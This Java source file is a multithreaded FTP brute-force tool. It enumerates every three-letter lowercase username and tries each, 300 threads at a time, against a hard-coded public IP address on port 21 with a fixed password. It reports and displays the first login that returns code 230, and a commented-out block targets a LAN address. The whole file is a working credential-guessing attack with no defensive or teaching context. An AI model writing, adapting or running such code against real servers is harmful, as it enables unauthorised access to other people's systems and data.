package z;

import org.apache.commons.net.ftp.FTPClient;
import pers.zhc.u.common.StrDic;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicInteger;

public class ftpL {
    private static CountDownLatch latch = null;
    private static List<String> l = new ArrayList<>();

    public static void main(String[] as) {
        /*for (int i = 0; i < 10000; i++) {
            System.out.println(i + ": " + ftpLogin("192.168.123.68", 8821, "zyr", "zhc"));
//            try {
//                Thread.sleep(0);
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
        }
        System.exit(0);*/
        final AtomicInteger N = new AtomicInteger();
        new StrDic(StrDic.alphabetL, 3).Do((s, n) -> {
            l.add(s);
            N.set(Integer.parseInt(n));
        });
        int k = 0;
        final String[] ss = l.toArray(new String[0]);
        for (int j = 0; j < ss.length; j++) {
            if (j % 300 == 0) {
                try {
                    if (latch != null) {
                        latch.await();
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                latch = new CountDownLatch(300);
                for (int i = 300 * k; i < 300 * (k + 1); i++) {
                    if (i == 17576) break;
//                    System.out.println("i: " + i + "ss[i]: " + ss[i]);
                    final int finalI = i;
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            for (int m = 0; m < 15; m++) {
                                int stt = 0;
                                for (int n = 0; n < 15; n++) {
                                    try {
                                        stt = ftpLogin("218.4.55.34", 21, ss[finalI], "88128812ab");
                                        if (stt != 0) {
                                            break;
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        System.out.println("check...");
                                        new Scanner(System.in).next();
                                    }
                                }
                                if (stt == 230) {
                                    String msg = "OK " + ss[finalI];
                                    System.out.println(msg);
                                    JOptionPane.showMessageDialog(null, msg);
                                    System.exit(0);
                                }
                                System.out.println(ss[finalI] + ": " + stt);
                                try {
                                    Thread.sleep(50);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }
                                latch.countDown();
                            }
                        }
                    }).start();
                }
                System.out.println("------------------------------------");
                ++k;
            }
        }
    }

    //failed 530
    //succeeded 230
    private static int ftpLogin(String host, int port, String un, String pw) throws Exception {
        FTPClient ftpClient = new FTPClient();
        ftpClient.connect(host, port);

        ftpClient.login(un, pw);
        return ftpClient.getReplyCode();
//            System.out.println("ftpClient.getReplyCode() = " + ftpClient.getReplyCode());
    }
}